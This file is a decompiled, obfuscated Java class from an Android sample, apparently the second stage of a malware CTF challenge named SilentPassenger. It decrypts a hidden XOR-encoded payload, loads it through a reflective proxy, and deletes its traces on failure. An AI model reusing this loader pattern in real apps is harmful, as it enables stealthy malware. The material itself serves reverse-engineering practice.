package com.c.j;

import android.content.Context;
import android.util.Log;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Proxy;

/* loaded from: D:\hommie_Ctf\SilentPassenger\extracted\stage2_unzip\classes_fixed.dex */
public final class c implements e {
    private static final String a = a.a("}nu", 10);
    private static final String b = a.a("|mt7sj{", 9);

    private static int a(Context context, InputStream inputStream) {
        File file = new File(m.b(context));
        if (!file.exists() && !file.mkdirs()) {
            throw new IOException(a.a("gerrsx$gviexi$lswx$hmv>$", 4) + file.getAbsolutePath());
        }
        File file2 = new File(file, b);
        DataInputStream dataInputStream = new DataInputStream(inputStream);
        try {
            FileOutputStream fileOutputStream = new FileOutputStream(file2);
            try {
                byte readByte = dataInputStream.readByte();
                int readFloat = (int) (dataInputStream.readFloat() * 100.0f);
                a(a.a("x}ti$A$", 4) + ((int) readByte));
                byte[] bArr = new byte[1024];
                while (true) {
                    int read = dataInputStream.read(bArr);
                    if (read == -1) {
                        fileOutputStream.flush();
                        fileOutputStream.close();
                        dataInputStream.close();
                        return readByte;
                    }
                    for (int i = 0; i < read; i++) {
                        bArr[i] = (byte) (bArr[i] ^ readFloat);
                    }
                    fileOutputStream.write(bArr, 0, read);
                }
            } finally {
            }
        } catch (Throwable th) {
            try {
                dataInputStream.close();
            } catch (Throwable th2) {
                th.addSuppressed(th2);
            }
            throw th;
        }
    }

    private static void a(File file, String str) {
        if (!file.exists() || file.delete()) {
            return;
        }
        a(str);
    }

    private static void a(String str) {
        try {
            Log.i(a, str);
        } catch (Throwable th) {
        }
    }

    @Override // com.c.j.e
    public final y a(Context context) {
        if (context == null) {
            throw new IllegalArgumentException(a.a("lxw}n\u0081})FF)w~uu", 9));
        }
        File file = new File(m.b(context), m.c);
        if (!file.exists()) {
            a(new File(m.b(context), m.d), a.a("ecppqv\"fgngvg\"uvcng\"jquv\"xgtukqp\"hkng", 2));
            throw new FileNotFoundException(a.a("jquv\"rc{nqcf\"pqv\"hqwpf", 2));
        }
        try {
            int a2 = a(context, new FileInputStream(file));
            String b2 = m.b(context);
            File file2 = new File(b2, b);
            if (file2.exists()) {
                file2.setReadOnly();
            }
            return (y) Proxy.newProxyInstance(y.class.getClassLoader(), new Class[]{y.class}, new i(new l(file2.getAbsolutePath(), b2, a2).a(l.a(a.a("wrjVpwruurK7tm|7}|j7vxl", 8), a2))));
        } catch (Exception e) {
            File file3 = new File(m.b(context));
            a(new File(file3, m.c), a.a("gerrsx$hipixi$feh$lswx$te}pseh", 4));
            a(new File(file3, m.d), a.a("ljwwx})mnun}n)kjm)qx|})\u007fn{|rxw)orun", 9));
            a(new File(file3, b), a.a("ljwwx})mnun}n)mnlxmnm)qx|})yj\u0082uxjm", 9));
            throw e;
        }
    }
}
